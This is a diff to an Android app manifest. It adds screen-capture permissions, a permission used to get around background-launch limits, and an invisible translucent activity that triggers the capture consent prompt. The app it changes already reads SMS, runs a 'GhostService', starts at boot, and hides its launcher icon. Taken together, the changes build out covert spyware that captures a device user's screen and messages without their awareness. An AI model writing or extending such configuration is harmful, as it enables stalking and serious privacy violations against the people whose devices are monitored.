@@ -11,6 +11,14 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
+    <!-- media capture -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <!-- exemption from background-activity-start restrictions (screen-capture
+         consent dialog launched from the service) -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
     <!-- runtime -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -38,6 +46,15 @@
             android:name=".MainActivity"
             android:exported="true" />
 
+        <!-- Invisible helper: pops the MediaProjection consent dialog, then
+             finishes. Translucent so nothing is visible on screen. -->
+        <activity
+            android:name=".ScreenCaptureActivity"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
         <!-- Launcher entry lives on an alias so MainActivity can stay enabled
              while the icon is hidden via setComponentEnabledSetting. -->
         <activity-alias
@@ -54,7 +71,7 @@
         <service
             android:name=".GhostService"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync|mediaProjection" />
 
         <receiver
             android:name=".BootReceiver"
